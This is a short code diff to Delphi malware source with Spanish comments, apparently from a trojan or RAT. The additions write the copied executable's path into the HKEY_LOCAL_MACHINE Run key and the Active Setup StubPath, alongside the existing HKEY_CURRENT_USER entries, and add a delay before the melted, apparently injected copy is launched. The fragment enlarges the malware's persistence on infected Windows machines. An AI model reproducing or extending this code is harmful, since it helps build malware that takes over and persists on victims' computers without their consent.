@@ -65,6 +65,7 @@ begin
           Clave := Clave + 'rsion\Run\';
           Clave := Clave + Configuracion.sRunRegKeyName;
           RegSetString(HKEY_CURRENT_USER, Clave, '"' + (Configuracion.sCopyTo + Configuracion.sFileNameToCopy) + '" s');
+          RegSetString(HKEY_LOCAL_MACHINE, Clave, '"' + (Configuracion.sCopyTo + Configuracion.sFileNameToCopy) + '" s');
         end;
 
       if (Configuracion.bArranqueActiveSetup) then
@@ -76,6 +77,7 @@ begin
           Clave := Clave + 'stalled Components\';
           Clave := Clave + Configuracion.sActiveSetupKeyName + '\StubPath';
           RegSetString(HKEY_CURRENT_USER, Clave, '"' + (Configuracion.sCopyTo + Configuracion.sFileNameToCopy) + '" s');
+          RegSetString(HKEY_LOCAL_MACHINE, Clave, '"' + (Configuracion.sCopyTo + Configuracion.sFileNameToCopy) + '" s');
         end;
 
       Sleep(20000); //20 sec
@@ -196,6 +198,7 @@ begin
               //Aqui ya estoy copiado, ejecuto el archivo copiado
               if Configuracion.bMelt = True then
                 begin
+                sleep(500);
                   if (Configuracion.sInyectadorFile <> '') then //Estamos inyectados
                     ShellExecute(GetDesktopWindow(), 'open',
                       PChar('"' + Configuracion.sCopyTo + Configuracion.sFileNameToCopy + '"'),
